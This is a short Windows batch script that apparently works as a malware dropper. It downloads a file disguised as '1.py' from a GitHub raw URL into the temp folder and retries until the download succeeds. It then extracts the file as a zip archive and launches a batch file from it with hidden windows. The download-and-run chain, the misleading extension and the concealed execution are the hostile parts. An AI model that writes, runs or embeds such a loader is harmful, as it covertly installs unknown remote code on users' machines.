@echo off
setlocal
set "url=https://raw.githubusercontent.com/Marinff/test/refs/heads/main/1.py"
set "tempdir=%temp%"
set "output=%tempdir%\1.py"
:download
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %output%"
for %%A in ("%output%") do (
    if %%~zA == 0 (
        del "%output%"
        timeout /t 1 > nul
        goto download
    )
)
powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\python\1.bat -WindowStyle Hidden"
exit
